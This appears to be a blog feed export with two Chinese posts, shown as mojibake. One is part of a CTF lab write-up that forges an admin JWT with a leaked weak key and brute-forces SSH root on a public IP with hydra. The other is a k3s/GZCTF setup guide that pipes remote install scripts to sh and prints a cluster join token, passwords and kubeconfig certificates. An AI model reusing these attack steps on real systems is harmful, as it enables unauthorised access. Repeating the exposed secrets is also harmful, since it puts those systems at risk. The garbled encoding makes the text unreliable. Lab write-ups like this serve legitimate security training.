<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file-manager:</span><br><span class="line">  name: admin</span><br><span class="line">  password: xj2023@1578921@123</span><br><span class="line">  jwtkey: 123456</span><br><span class="line">#flag&#123;9d7ffcef-bcd1-4f4b-9a2d-d51862484168&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ mysql é…ç½®ã€ä½†æ˜¯åœ¨dockeré‡Œé¢å¥½åƒæ²¡æœ‰mysqlâ€¦ï¼Œåç»­ç™»å½•åˆ°sshä¸­ä¹Ÿæœªå‘ç°å­˜åœ¨mysqlã€‘</p>
<p><img src="/posts/b8335347/image-20240607152343544.png" alt="image-20240607152343544"></p>
<h4 id="3-File-Management-Systemçš„-flag"><a href="#3-File-Management-Systemçš„-flag" class="headerlink" title="3.File Management Systemçš„ flag"></a>3.File Management Systemçš„ flag</h4><p>åœ¨Nacosä¸­ç¿»åˆ°FMSçš„è´¦å·å¯†ç  è®¿é—®8082ç«¯å£</p>
<p><img src="/posts/b8335347/image-20240607152431126.png" alt="image-20240607152431126"></p>
<p>æç¤ºæƒé™ä¸å¤Ÿ è¦æ±‚ç”¨sysadmin123456è¿›è¡Œç™»å½•</p>
<p>æŠ“åŒ…çœ‹åˆ°æ˜¯jwtè®¤è¯ï¼Œå°†nameä»adminæ”¹æˆsysadmin123456 åœ¨ç­¾åä¸­ä½¿ç”¨jwtkey 123456</p>
<p><img src="/posts/b8335347/image-20240607152517662.png" alt="image-20240607152517662"></p>
<p>ç”Ÿæˆ  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJob3N0IiwibmFtZSI6InN5c2FkbWluMTIzNDU2IiwiZXhwIjoxNzE3NzMyNDU3LCJpYXQiOjE3MTc3MjUyNTd9.cUzyE8BizVxrRwVk1J_YFIUr2ED272TTGb_6ki0vvOc</p>
<p>å»æ›¿æ¢burpè¯·æ±‚åŒ…ä¸­çš„tokenå»åˆ›å»ºç›®å½•ï¼Œå‘ç°åˆ›å»ºæˆåŠŸï¼Œè¯´æ˜æ–¹æ³•å¯è¡Œï¼Œæ‰§è¡Œæ—¶æˆåŠŸä¸ºsysadmin123456ç”¨æˆ·ã€‚</p>
<p><img src="/posts/b8335347/image-20240607152609216.png" alt="image-20240607152609216"></p>
<p>ç„¶åé‡æ–°æŠŠè¯·æ±‚åŒ…çš„ tokenæ”¹æˆä¿®æ”¹åçš„ jwt åˆ·æ–°æˆåŠŸä¸ºé«˜æƒé™çš„ sysadmin123456ï¼Œçœ‹åˆ°é‡Œé¢åŒ…å«ä¸€ä¸ªè¿ç»´è´¦å·ã€å›¾ç‰‡åŠä¸€ä¸ªtxt</p>
<p><img src="/posts/b8335347/image-20240607152625661.png" alt="image-20240607152625661"></p>
<p>ä¸‹è½½è¿ç»´è´¦å·è¡¨  ä¿æŠ¤å¤§é‡IPåŠ rootå¯†ç   ä½†æ˜¯ä¸çŸ¥é“é‚£ä¸ªå¯†ç æ˜¯æœ‰æ•ˆçš„ å»çˆ†ç ´ä¸‹ssh 2222</p>
<p><img src="/posts/b8335347/image-20240607152651482.png" alt="image-20240607152651482"></p>
<p>ç¿»å®Œäº†ä¸‰ä¸ªæ–‡ä»¶ ä½†æ˜¯è¿˜æ²¡æœ‰æ‰¾åˆ°flag â€¦</p>
<p>ä¼ ä¸ªæ–‡ä»¶è¯•è¯•. åœ¨haeæ’ä»¶é‡Œé¢ è®¾ç½®äº†ä¸ª flagå…³é”®å­— ç¿»ä¸‹History </p>
<p>åœ¨ä¸Šä¼ æˆåŠŸå æ‰¾åˆ°flag </p>
<p><img src="/posts/b8335347/image-20240607152811728.png" alt="image-20240607152811728"></p>
<p>  flag{d6c578d4a41a141d731fe7c36c8c0f77}</p>
<h4 id="4-root-å¯†ç å¤šå°‘-flag-password"><a href="#4-root-å¯†ç å¤šå°‘-flag-password" class="headerlink" title="4.root å¯†ç å¤šå°‘ flag{password}"></a>4.root å¯†ç å¤šå°‘ flag{password}</h4><p>FMS é‡Œé¢ç»™äº† root å¯†ç  ä½†æ˜¯ æœ‰å¾ˆå¤šipçš„ </p>
<p>æŠŠå¯†ç æå–å‡ºæ¥ä½œä¸ºå­—å…¸å»çˆ†ç ´</p>
<p>æœ¬æ¥ç”¨è¶…çº§å¼±å£ä»¤å·¥å…·çš„ æŠŠsshç«¯å£æ”¹æˆ2222 ä½†æ˜¯æ‰«æè¿˜æ˜¯æ‰«ä¸å‡ºæ¥ æ¼!</p>
<p>æ¢hydraè¯•è¯•</p>
<p>â””â”€$ hydra -l root -P 2222.txt   -t 4  ssh://52.83.41.206 -s 2222</p>
<p><img src="/posts/b8335347/image-20240607152851297.png" alt="image-20240607152851297"></p>
<p>æ‰¾åˆ°root å¯†ç  imArGcj9</p>
<p>flag{imArGcj9}</p>
<h4 id="5-é»‘å®¢ç•™ä¸‹çš„-backdoor-åé—¨çš„ç»å¯¹è·¯å¾„"><a href="#5-é»‘å®¢ç•™ä¸‹çš„-backdoor-åé—¨çš„ç»å¯¹è·¯å¾„" class="headerlink" title="5.é»‘å®¢ç•™ä¸‹çš„ backdoor åé—¨çš„ç»å¯¹è·¯å¾„"></a>5.é»‘å®¢ç•™ä¸‹çš„ backdoor åé—¨çš„ç»å¯¹è·¯å¾„</h4><p>ç™»å½•ssh  æ³¨æ„sshç«¯å£æ˜¯2222ï¼  å¯†ç ä¸º imArGcj9</p>
<p><img src="/posts/b8335347/image-20240607152939260.png" alt="image-20240607152939260"></p>
<p>æŸ¥çœ‹è´¦å·å’Œç›¸å…³æ–‡ä»¶å¤‡ä»½ï¼Œæ²¡å‘ç°å•¥æœ‰ç”¨ä¿¡æ¯ã€‚æ‰¾äº†ä¸‹è®¡åˆ’ä»»åŠ¡ å¯åŠ¨é¡¹ æ²¡æ‰¾åˆ°ä¸œè¥¿ã€åœ¨/etc/shadow å’Œ shadow/.bakä¸­ çœ‹åˆ°ä¸€ä¸ª_aptè´¦å·æ„Ÿè§‰æœ‰ç‚¹å¯ç–‘ã€‘ </p>
<p><img src="/posts/b8335347/image-20240607153007705.png" alt="image-20240607153007705"></p>
<p><img src="/posts/b8335347/image-20240607153059757.png" alt="image-20240607153059757"></p>
<p>æ‰¾ä¸‹ nacos\ fmsç›¸å…³ï¼Œå‘ç°ä¸€ä¸ª evilfms.service </p>
<p>å…¶è·¯å¾„ä¸º ./etc/systemd/system/multi-user.target.wants/evilfms.serviceã€ä½†æ˜¯æ­¤é¢˜çš„é—®é¢˜æè¿°æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯è®©æäº¤æ¶æ„åé¢çš„ç»å¯¹è·¯å¾„ å°è¯•äº†å¥½å‡ æ¬¡ æœ€ç»ˆç¡®å®š flag{/etc/systemd/system/svilfms.service}</p>
<p><img src="/posts/b8335347/image-20240607153115444.png" alt="image-20240607153115444"></p>
<p>flag{/etc/systemd/system/svilfms.service}</p>
<h4 id="6-ä¿®å¤-4000-6000-ç«¯å£æ¼æ´"><a href="#6-ä¿®å¤-4000-6000-ç«¯å£æ¼æ´" class="headerlink" title="6.ä¿®å¤ 4000-6000 ç«¯å£æ¼æ´"></a>6.ä¿®å¤ 4000-6000 ç«¯å£æ¼æ´</h4><p>5000ç«¯å£ å­˜åœ¨  Docker Register APIæœªæˆæƒ</p>
<p>åœ¨é˜²ç«å¢™ä¸Š é…ç½® ç¦æ­¢å¤–ç½‘è®¿é—® 5000 ç«¯å£</p>
<p><code>iptables -F</code> æ¸…é™¤åŸæ¥çš„ã€ä¸ç„¶ä¸èµ·ä½œç”¨ã€‘</p>
<p><code>sudo iptables -A INPUT -p tcp --dport 5000 -j DROP</code></p>
<h4 id="7-ä¿®å¤File-Management-Systemæ¼æ´"><a href="#7-ä¿®å¤File-Management-Systemæ¼æ´" class="headerlink" title="7.ä¿®å¤File Management Systemæ¼æ´"></a>7.ä¿®å¤File Management Systemæ¼æ´</h4><p>FMSä¸­å­˜åœ¨ JWTç»•è¿‡ï¼Œæ‰¾åˆ°å¯¹åº”æœåŠ¡ä½¿ç”¨çš„jaråŒ…åœ¨ homeç›®å½•ä¸‹  åä¸º fms.jar </p>
<p>jadx-gui æ‰“å¼€ fms.jar</p>
<p>æ£€ç´¢å…³é”®è¯ sysadmin</p>
<p><img src="/posts/b8335347/image-20240607154232266.png" alt="image-20240607154232266"></p>
<p><img src="/posts/b8335347/image-20240607160249508.png" alt="image-20240607160249508"></p>
<p>jwtè¿™å— éœ€è¦åŠ æ ¡éªŒ</p>
<p>ã€ä¸ä¼šä¿®ã€‘o.0</p>
<h4 id="8-æ¸…ç†é»‘å®¢ç•™ä¸‹çš„backdoor"><a href="#8-æ¸…ç†é»‘å®¢ç•™ä¸‹çš„backdoor" class="headerlink" title="8.æ¸…ç†é»‘å®¢ç•™ä¸‹çš„backdoor"></a>8.æ¸…ç†é»‘å®¢ç•™ä¸‹çš„backdoor</h4><p>åé—¨è¢«æ¸…äº†ï¼Ÿï¼Ÿï¼Ÿ o.0 è¿˜æ˜¯æ²¡è®¾ç½®åé—¨å‘¢</p>
<p>cat /etc/systemed/system/evilfms.service </p>
<p><img src="/posts/b8335347/image-20240607153442790.png" alt="image-20240607153442790"></p>
<p>å…¬ç½‘è®¿é—® è¿™ä¸ªurl http://<IP>:8082/assets/images/fti/txt.png</IP></p>
<p>ä¸‹è½½ä¸‹æ¥ 010editorçœ‹äº†ä¸‹ å°±æ˜¯ä¸ªpng å¹¶ä¸æ˜¯elfæ–‡ä»¶</p>
<p>åœ¨é¶æœºä¸Šè¿è¡Œ ä¹Ÿè‡ªç„¶ä¸æ˜¯é‚£ä¸ª â€åé—¨â€œ</p>
<p><img src="/posts/b8335347/image-20240607155014549.png" alt="image-20240607155014549"></p>
<p><img src="/posts/b8335347/image-20240607155305869.png" alt="image-20240607155305869"></p>
<p>åœ¨jadxä¸­æ‰¾åˆ°è¯¥è·¯å¾„ä¸‹ ä¹Ÿæ˜¯æ­£å¸¸æ–‡ä»¶ o.0?!! ã€ä¸çŸ¥æ˜¯æ²¡æœ‰åé—¨ è¿˜æ˜¯æ²¡æ‰¾åˆ° å¼„äº†å¾ˆä¹…å…ˆä¸å¼„è¿™ä¸ªäº†ã€‘</p>
<p><img src="/posts/b8335347/image-20240607155722861.png" alt="image-20240607155722861"></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://www.cnblogs.com/programmer-tlh/p/10996443.html">https://www.cnblogs.com/programmer-tlh/p/10996443.html</a></p>
<p><a href="https://blog.csdn.net/y995zq/article/details/137668381">https://blog.csdn.net/y995zq/article/details/137668381</a></p>
<p><a href="https://www.cnblogs.com/f-carey/p/18055849#tid-nzXisP">https://www.cnblogs.com/f-carey/p/18055849#tid-nzXisP</a></p>
]]></content>
  </entry>
  <entry>
    <title>k3s_dockeråˆ†ç¦»éƒ¨ç½²gzctf</title>
    <url>/posts/c2d41507/</url>
    <content><![CDATA[<p>k3s+docker éƒ¨ç½²gzctfè¿‡ç¨‹è®°å½•</p>
<h2 id="å‡†å¤‡é˜¶æ®µ"><a href="#å‡†å¤‡é˜¶æ®µ" class="headerlink" title="å‡†å¤‡é˜¶æ®µ"></a>å‡†å¤‡é˜¶æ®µ</h2><h3 id="æœåŠ¡å™¨x3"><a href="#æœåŠ¡å™¨x3" class="headerlink" title="æœåŠ¡å™¨x3"></a>æœåŠ¡å™¨x3</h3><p>k3s-master        192.168.80.20</p>
<p>k3s-slave        192.168.80.27(26)</p>
<p>gzctfweb         192.168.80.28(63)</p>
<p>åˆ«ç”¨dhcp å¼„ä¸ªé åçš„ipæ¡¥æ¥</p>
<h3 id="ä¿®æ”¹ç”¨æˆ·å"><a href="#ä¿®æ”¹ç”¨æˆ·å" class="headerlink" title="ä¿®æ”¹ç”¨æˆ·å"></a>ä¿®æ”¹ç”¨æˆ·å</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname gzctfweb  # gzctfwebæœåŠ¡å™¨æ‰§è¡Œ</span><br><span class="line">hostnamectl set-hostname k3s-master</span><br><span class="line">hostnamectl set-hostname k3s-slave</span><br></pre></td></tr></table></figure>



<h3 id="å…³é—­é˜²ç«å¢™-ä¸‰å°æœºå™¨éƒ½æ‰§è¡Œ"><a href="#å…³é—­é˜²ç«å¢™-ä¸‰å°æœºå™¨éƒ½æ‰§è¡Œ" class="headerlink" title="å…³é—­é˜²ç«å¢™  ä¸‰å°æœºå™¨éƒ½æ‰§è¡Œ"></a>å…³é—­é˜²ç«å¢™  ä¸‰å°æœºå™¨éƒ½æ‰§è¡Œ</h3><p>ubuntu  å…³é—­é˜²ç«å¢™</p>
<p>sudo ufw disable </p>
<p>æ¸…ç©ºiptablesè§„åˆ™</p>
<p>iptables -F</p>
<h3 id="é…ç½®hostsè§£æ"><a href="#é…ç½®hostsè§£æ" class="headerlink" title="é…ç½®hostsè§£æ"></a>é…ç½®hostsè§£æ</h3><p>åœ¨k3s masterå’Œ slaveä¸­æ‰§è¡Œ</p>
<p>cat &gt;&gt;/etc/hosts&lt;&lt;EOF 192.168.80.20 k3s-master 192.168.80.27 k3s-slave  EOF</p>
<h3 id="å®‰è£…dockerã€k3s-master-slaveæ‰§è¡Œã€‘"><a href="#å®‰è£…dockerã€k3s-master-slaveæ‰§è¡Œã€‘" class="headerlink" title="å®‰è£…dockerã€k3s master\slaveæ‰§è¡Œã€‘"></a>å®‰è£…dockerã€k3s master\slaveæ‰§è¡Œã€‘</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://releases.rancher.com/install-docker/20.10.sh | sh</span><br><span class="line">systemctl enable --now docker  # dockerå¼€å¯è‡ªå¯</span><br></pre></td></tr></table></figure>



<h2 id="k3s-éƒ¨ç½²-gzctf"><a href="#k3s-éƒ¨ç½²-gzctf" class="headerlink" title="k3s éƒ¨ç½² gzctf"></a>k3s éƒ¨ç½² gzctf</h2><h3 id="1-å®‰è£…k3sé›†ç¾¤"><a href="#1-å®‰è£…k3sé›†ç¾¤" class="headerlink" title="1.å®‰è£…k3sé›†ç¾¤"></a>1.å®‰è£…k3sé›†ç¾¤</h3><p>æŒ‰gzctfä¸­ ä¸‹è½½k3s  </p>
<p>curl -sfL <a href="https://rancher-mirror.rancher.cn/k3s/k3s-install.sh">https://rancher-mirror.rancher.cn/k3s/k3s-install.sh</a> | INSTALL_K3S_MIRROR=cn sh -</p>
<p>ä½†ä¸åŠ é…ç½®å‚æ•° åŠ åˆ«çš„é¢å¤–å‚æ•°ä¼šæŠ¥é”™</p>
<h3 id="2-å®‰è£…slaveèŠ‚ç‚¹"><a href="#2-å®‰è£…slaveèŠ‚ç‚¹" class="headerlink" title="2.å®‰è£…slaveèŠ‚ç‚¹"></a>2.å®‰è£…slaveèŠ‚ç‚¹</h3><p>åœ¨k3s-masterä¸­æŸ¥çœ‹ token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/lib/rancher/k3s/server/node-token </span><br><span class="line">K1049517f32c21a31aac5b53e5423386b6b0ae9b0e706b06cc1baebfe3e474929a3::server:ab280ce6ccffbd6d5c97a9036f973072</span><br></pre></td></tr></table></figure>

<p>å°†toeknå’Œ masterå¯¹åº”ipå¡«å…¥ é…ç½®slaveç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_EXEC=&quot;--docker&quot; K3S_URL=https://192.168.80.20:6443 K3S_TOKEN=K1049517f32c21a31aac5b53e5423386b6b0ae9b0e706b06cc1baebfe3e474929a3::server:ab280ce6ccffbd6d5c97a9036f973072 sh -  </span><br><span class="line"></span><br><span class="line"># å¼€æœºè‡ªå¯</span><br><span class="line">systemctl enable --now k3s-agent.service</span><br></pre></td></tr></table></figure>



<h3 id="3-æ›´æ”¹nodeport-ç«¯å£èŒƒå›´ã€masteræ‰§è¡Œã€‘"><a href="#3-æ›´æ”¹nodeport-ç«¯å£èŒƒå›´ã€masteræ‰§è¡Œã€‘" class="headerlink" title="3.æ›´æ”¹nodeport ç«¯å£èŒƒå›´ã€masteræ‰§è¡Œã€‘"></a>3.æ›´æ”¹nodeport ç«¯å£èŒƒå›´ã€masteræ‰§è¡Œã€‘</h3><p>vim /etc/systemd/system/k3s.service</p>
<p>åœ¨ExecStart = /usr/local/bin/k3s æœ€åå†™å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--kube-apiserver-arg service-node-port-range=20000-50000</span><br></pre></td></tr></table></figure>



<h3 id="4-æ›´æ”¹k3så®¹å™¨æ•°é‡é™åˆ¶ã€master-slaveæ‰§è¡Œã€‘"><a href="#4-æ›´æ”¹k3så®¹å™¨æ•°é‡é™åˆ¶ã€master-slaveæ‰§è¡Œã€‘" class="headerlink" title="4.æ›´æ”¹k3så®¹å™¨æ•°é‡é™åˆ¶ã€master/slaveæ‰§è¡Œã€‘"></a>4.æ›´æ”¹k3så®¹å™¨æ•°é‡é™åˆ¶ã€master/slaveæ‰§è¡Œã€‘</h3><p>vim /etc/rancher/k3s/kubelet.config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: kubelet.config.k8s.io/v1beta1</span><br><span class="line">kind: KubeletConfiguration</span><br><span class="line">maxPods: 500  # å®¹å™¨æ•°é‡é™åˆ¶</span><br></pre></td></tr></table></figure>

<p>vim /etc/systemd/system/k3s.service</p>
<p>åœ¨ExecStart=/usr/local/bin/k3sæœ€åå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--kubelet-arg=config=/etc/rancher/k3s/kubelet.config</span><br></pre></td></tr></table></figure>



<h3 id="5-æ·»åŠ dockeré•œåƒä»“åº“ã€masteræ‰§è¡Œã€‘"><a href="#5-æ·»åŠ dockeré•œåƒä»“åº“ã€masteræ‰§è¡Œã€‘" class="headerlink" title="5.æ·»åŠ dockeré•œåƒä»“åº“ã€masteræ‰§è¡Œã€‘"></a>5.æ·»åŠ dockeré•œåƒä»“åº“ã€masteræ‰§è¡Œã€‘</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mirrors:</span><br><span class="line">  &quot;docker.io&quot;:</span><br><span class="line">    endpoint:</span><br><span class="line">      - &quot;https://hub.docker.com&quot;</span><br></pre></td></tr></table></figure>



<h3 id="6-é…ç½®å®Œæˆå-é‡å¯k3sé›†ç¾¤"><a href="#6-é…ç½®å®Œæˆå-é‡å¯k3sé›†ç¾¤" class="headerlink" title="6.é…ç½®å®Œæˆå é‡å¯k3sé›†ç¾¤"></a>6.é…ç½®å®Œæˆå é‡å¯k3sé›†ç¾¤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart k3s  # masterèŠ‚ç‚¹</span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart k3s-agent # slaveèŠ‚ç‚¹</span><br></pre></td></tr></table></figure>



<h3 id="7-gzctfwebé…ç½®"><a href="#7-gzctfwebé…ç½®" class="headerlink" title="7.gzctfwebé…ç½®"></a>7.gzctfwebé…ç½®</h3><ol>
<li>docker-compose.yml</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3.0&#x27;</span><br><span class="line">services:</span><br><span class="line">  gzctf:</span><br><span class="line">    image: gztime/gzctf:latest</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - &quot;GZCTF_ADMIN_PASSWORD=Admin123&quot;  # gzctfç®¡ç†å‘˜åˆå§‹å¯†ç </span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:8080&quot;</span><br><span class="line">    networks:</span><br><span class="line">      default:</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;./data/files:/app/files&quot;</span><br><span class="line">      - &quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br><span class="line">      - &quot;./logs:/app/log&quot;</span><br><span class="line">      # - &quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;</span><br><span class="line">      - &quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span><br><span class="line">      # - &quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line"> </span><br><span class="line">  db:</span><br><span class="line">    image: postgres:alpine</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - &quot;POSTGRES_PASSWORD=admin123&quot;  # æ•°æ®åº“çš„å¯†ç </span><br><span class="line">    networks:</span><br><span class="line">      default:</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;./data/db:/var/lib/postgresql/data&quot;</span><br><span class="line"> </span><br><span class="line">networks:</span><br><span class="line">  default:</span><br><span class="line">    driver: bridge</span><br><span class="line">    ipam:</span><br><span class="line">      config:</span><br><span class="line">        - subnet: 192.168.12.0/24</span><br></pre></td></tr></table></figure>



<ol>
<li>appsettings.json</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;AllowedHosts&quot;: &quot;*&quot;,</span><br><span class="line">  &quot;ConnectionStrings&quot;: &#123;</span><br><span class="line">    &quot;Database&quot;: &quot;Host=db:5432;Database=gzctf;Username=postgres;Password=admin123&quot;  //æ•°æ®åº“çš„ä¿¡æ¯</span><br><span class="line">    // redis is optional</span><br><span class="line">    //&quot;RedisCache&quot;: &quot;cache:6379,password=&lt;Redis Password&gt;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;Logging&quot;: &#123;</span><br><span class="line">    &quot;LogLevel&quot;: &#123;</span><br><span class="line">      &quot;Default&quot;: &quot;Information&quot;,</span><br><span class="line">      &quot;Microsoft&quot;: &quot;Warning&quot;,</span><br><span class="line">      &quot;Microsoft.Hosting.Lifetime&quot;: &quot;Information&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;EmailConfig&quot;: &#123;</span><br><span class="line">    &quot;SendMailAddress&quot;: &quot;a@a.com&quot;,</span><br><span class="line">    &quot;UserName&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Password&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Smtp&quot;: &#123;</span><br><span class="line">      &quot;Host&quot;: &quot;localhost&quot;,</span><br><span class="line">      &quot;Port&quot;: 587</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;XorKey&quot;: &quot;z&quot;,  //å¼‚æˆ–åŠ å¯†å¯†é’¥</span><br><span class="line">  &quot;ContainerProvider&quot;: &#123;</span><br><span class="line">    &quot;Type&quot;: &quot;Kubernetes&quot;, // or &quot;Kubernetes&quot;</span><br><span class="line">    &quot;PublicEntry&quot;: &quot;192.168.80.20&quot;, // å†™k3s-masterçš„ip</span><br><span class="line">    &quot;DockerConfig&quot;: &#123;</span><br><span class="line">      // optional</span><br><span class="line">      &quot;SwarmMode&quot;: false,</span><br><span class="line">      &quot;Uri&quot;: &quot;unix:///var/run/docker.sock&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;RequestLogging&quot;: false,</span><br><span class="line">  &quot;DisableRateLimit&quot;: false,</span><br><span class="line">  &quot;RegistryConfig&quot;: &#123;</span><br><span class="line">    &quot;UserName&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Password&quot;: &quot;&quot;,</span><br><span class="line">    &quot;ServerAddress&quot;: &quot;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;GoogleRecaptcha&quot;: &#123;</span><br><span class="line">    &quot;VerifyAPIAddress&quot;: &quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;,</span><br><span class="line">    &quot;Sitekey&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Secretkey&quot;: &quot;&quot;,</span><br><span class="line">    &quot;RecaptchaThreshold&quot;: &quot;0.5&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol>
<li>kube-config.yaml</li>
</ol>
<p>åœ¨masteræœºå™¨ä¸­ cat /etc/rancher/k3s/k3s.yaml åœ¨webæœºå™¨ä¸­å¦å­˜ä¸º kube-config.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTVRZNE9ESTBNamN3SGhjTk1qUXdOVEk0TURjME56QTNXaGNOTXpRd05USTJNRGMwTnpBMwpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTVRZNE9ESTBNamN3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFRNm9sRE53c3RUN2k5S1A3VXUyZzdmNlRnZ3AycnVHMWxubWJMWFRNeSsKb3hHZmVBUDRGam0rYzBJd0JMY1JyRnVXcVZlZ1g2T0x4dzRvRkMzS3NRM2tvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXMvSUZtaGRNeGsrNGc2TkFXMnU3CjJGU1M3eXN3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnR1lqYkFUYnBrWGQydEZ6c3FUamdFc0VWdmx6UWNsK1EKdzV6SWIvWC9ZZkVDSVFDc3dtek1rSVhYbEJ2dm51OTQxNS9rNFdoY2p2aEhyWThCRTRzQkZtMWZjZz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K</span><br><span class="line">    server: https://192.168.80.20:6443  //å†™k3s-masterçš„ip:porthttps://127.0.0.1:6443</span><br><span class="line">  name: default</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: default</span><br><span class="line">    user: default</span><br><span class="line">  name: default</span><br><span class="line">current-context: default</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: default</span><br><span class="line">  user:</span><br><span class="line">    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJrVENDQVRlZ0F3SUJBZ0lJYS8xZEwxMXNkUkV3Q2dZSUtvWkl6ajBFQXdJd0l6RWhNQjhHQTFVRUF3d1kKYXpOekxXTnNhV1Z1ZEMxallVQXhOekUyT0RneU5ESTNNQjRYRFRJME1EVXlPREEzTkRjd04xb1hEVEkxTURVeQpPREEzTkRjd04xb3dNREVYTUJVR0ExVUVDaE1PYzNsemRHVnRPbTFoYzNSbGNuTXhGVEFUQmdOVkJBTVRESE41CmMzUmxiVHBoWkcxcGJqQlpNQk1HQnlxR1NNNDlBZ0VHQ0NxR1NNNDlBd0VIQTBJQUJISFlIbDMvL0EybnZ3alAKNDUxeHU0REhDbUtacTY4aXRqUHhJSkdaaE5MWU1yY1pXWnZjZWFZN1FXeERvZi9KcVJUekdGY3RPUXV3V1NNOQpvd1NJd1IralNEQkdNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUtCZ2dyQmdFRkJRY0RBakFmCkJnTlZIU01FR0RBV2dCUll1YmlPTUZNZHhFb0Z2bVRDeGFIaHdhODBkVEFLQmdncWhrak9QUVFEQWdOSUFEQkYKQWlBOU5tL0lPdTBqQ25aNGtjaWJqTEdCSUgyRFllMmdLNklWb3ppQXdrZXQxZ0loQU5qdlJSUzEvYitRU1c3eAp3TktBYUQrTkdTbXhmd1dHZWJ5aGtmZVJvMGhuCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KLS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJlRENDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdFkyeHAKWlc1MExXTmhRREUzTVRZNE9ESTBNamN3SGhjTk1qUXdOVEk0TURjME56QTNXaGNOTXpRd05USTJNRGMwTnpBMwpXakFqTVNFd0h3WURWUVFEREJock0zTXRZMnhwWlc1MExXTmhRREUzTVRZNE9ESTBNamN3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFSa29zNWYyU2pWNWhHWHhTMERoMlZUR01FMktYV3gzb0NWSWhzY3JCYXQKdlRaZjJmSi9oRHZNeTlOTmdpMHlTMW9CWnBvNVQwTkJLY25YZ0lnNlN1ZnFvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVVdMbTRqakJUSGNSS0JiNWt3c1doCjRjR3ZOSFV3Q2dZSUtvWkl6ajBFQXdJRFNRQXdSZ0loQUlXbHcraUNkL25uZjRJaittekFlSHZNbDc0Q2o4V0kKRnBYM3djcjcyTytxQWlFQXZiT2dRT0RVNExFdWdxRCtGSHRYdWVtTHBSeHdDK2thTjJNN3JyVEJzRzA9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K</span><br><span class="line">    client-key-data: 